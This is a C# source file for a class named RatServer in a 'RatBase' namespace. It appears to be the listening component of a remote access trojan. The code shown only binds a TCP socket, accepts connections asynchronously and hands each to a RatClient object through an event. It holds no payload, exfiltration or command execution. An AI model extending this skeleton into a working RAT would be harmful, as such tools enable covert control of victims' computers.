using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RatBase
{
    public class RatServer : IDisposable
    {

        public event DClientConnected ClientConnected;

        public delegate void DClientConnected(RatServer sender, RatClient client);

        #region "Public methods"
        public void Listen(int port)
        {
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress hostIP = (Dns.Resolve(IPAddress.Any.ToString())).AddressList[0];
            IPEndPoint ep = new IPEndPoint(hostIP, port);
            socket.Bind(ep);
            socket.Listen(100);
            socket.BeginAccept(new AsyncCallback(AcceptCallback), this);
        }
        #endregion

        #region "Callbacks"
        protected static void AcceptCallback(IAsyncResult ar)
        {
            RatServer context = (RatServer)ar.AsyncState;
            try
            {
                Socket connection = context.socket.EndAccept(ar);
                RatClient client = new RatClient(connection);

                context.OnClientConnected(client);
            }
            catch (SocketException e)
            {

            }
            context.socket .BeginAccept(new AsyncCallback(AcceptCallback), context);
        }
        #endregion

        #region "Event handlers"
        protected void OnClientConnected(RatClient client)
        {
            ClientConnected?.Invoke(this, client);
        }
        #endregion

        #region "Disposable pattern"
        public void Dispose()
        {
            socket?.Dispose();
        }
        #endregion

#region "Fields"
        private Socket socket;
#endregion
    }
}
